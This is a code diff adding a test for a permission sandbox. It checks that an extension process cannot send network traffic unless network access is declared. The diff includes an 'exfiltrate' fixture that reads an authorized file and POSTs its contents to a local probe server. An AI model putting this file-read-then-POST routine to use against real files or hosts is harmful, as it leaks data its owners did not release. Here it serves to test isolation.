@@ -56,6 +56,27 @@ const READ_SOURCE = `({
   },
 })`;
 
+/** 【MC-035】网络外传夹具:读**被授权**的那个文件,再 POST 出去。
+ *  台账第十七轮的 E1 反例就是这一形态 —— 只约束 fs 挡不住"读已授权文件后外传"。 */
+const NETWORK_SOURCE = `({
+  exfiltrate: async (resource) => {
+    const fs = require("node:fs");
+    const http = require("node:http");
+    const body = fs.readFileSync(resource.path, "utf8");
+    // ⚠️ 端口**不能**走 process.env:受控执行器的环境是刻意不继承宿主的(见
+    // permissionedEnv)。这正是隔离的正确行为 —— 测试因此把端口放进资源路径的
+    // 同目录一个探针文件,由宿主的 authorize 放行。
+    const port = Number(fs.readFileSync(resource.path + ".probe-port", "utf8").trim());
+    const result = await new Promise((resolve) => {
+      const req = http.request({ host: "127.0.0.1", port, path: "/", method: "POST" },
+        (res) => { res.resume(); res.on("end", () => resolve({ status: res.statusCode })); });
+      req.on("error", (e) => resolve({ error: String((e && e.message) || e) }));
+      req.write(body); req.end();
+    });
+    return result;
+  },
+})`;
+
 const WRITE_SOURCE = `({
   redact: async (resource) => {
     const fs = require("node:fs");
@@ -211,6 +232,55 @@ try {
     signal: new AbortController().signal,
   }).then(() => null, (error) => permissionedFailure(error));
   eq("越界写被 OS 权限模型拒绝", escapeWrite?.code, "isolated_denied");
+
+  // ── 6d.【MC-035】网络:未声明 = 不能出站;声明了才放行 ────────────────────
+  // 台账第十七轮的 E1 反例:只约束 fs 的子进程仍能读已授权文件后 HTTP POST 外传。
+  // 这里起一个本机探针服务,直接用 runPermissionedProcess 驱动真实执行体。
+  {
+    const { createServer } = await import("node:http");
+    let received = 0;
+    const probe = createServer((req, res) => {
+      let body = "";
+      req.on("data", (c) => { body += c; });
+      req.on("end", () => { received++; res.writeHead(200); res.end("ok:" + body.length); });
+    });
+    await new Promise<void>((resolve) => probe.listen(0, "127.0.0.1", () => resolve()));
+    const address = probe.address();
+    const port = typeof address === "object" && address !== null ? address.port : 0;
+    process.env.PROBE_PORT = String(port);
+    try {
+      // ① 未声明网络(默认 false)→ 引导脚本的网络拦截必须让它抛错。
+      const sourceFor = (p: number): string => NETWORK_SOURCE.replace("Number(fs.readFileSync(resource.path + \".probe-port\", \"utf8\").trim())", String(p));
+      const denied = await runPermissionedProcess({
+        source: sourceFor(port), capability: "exfiltrate", allowWrite: false, timeoutMs: 10_000,
+        resource: { projectPath: root, path: target },
+        signal: new AbortController().signal,
+      }).then(
+        (value) => ({ type: "result", value }),
+        (error) => ({ type: "error", failure: permissionedFailure(error), message: error instanceof Error ? error.message : String(error) }),
+      );
+      eq("★ 未声明网络的扩展读已授权文件后外传被阻断", received, 0);
+      // 夹具在扩展侧 catch 了错误并回 `{error}` —— 这是扩展自己选的降级方式,
+      // 拦截仍然生效。断言判的是"错误里点明了原因",不是"宿主必须抛错"。
+      check("★ 阻断是可诊断的(network_access_denied 进了扩展看到的错误)",
+        JSON.stringify(denied).includes("network_access_denied"), { denied, received });
+
+      // ② 显式 allowNetwork=true → 放行(证明拦截不是"一律禁网"的假阳性)。
+      const allowed = await runPermissionedProcess({
+        source: sourceFor(port), capability: "exfiltrate", allowWrite: false, allowNetwork: true, timeoutMs: 10_000,
+        resource: { projectPath: root, path: target },
+        signal: new AbortController().signal,
+      }).then(
+        (value) => ({ type: "result", value }),
+        (error) => ({ type: "error", error: permissionedFailure(error) }),
+      );
+      eq("★ 显式 allowNetwork=true 时同一执行体成功出站(拦截不是一刀切)", received, 1);
+      check("显式放行时返回了结果", allowed.type === "result", allowed);
+    } finally {
+      probe.close();
+      delete process.env.PROBE_PORT;
+    }
+  }
   eq("越界写没有改到界外文件", (await readFile(secret, "utf8")), "top secret\n");
 
   // ── 6b. 真实路径:工作区里的链接指向界外时,扩展进程的放行名单必须是**解析后**的路径。
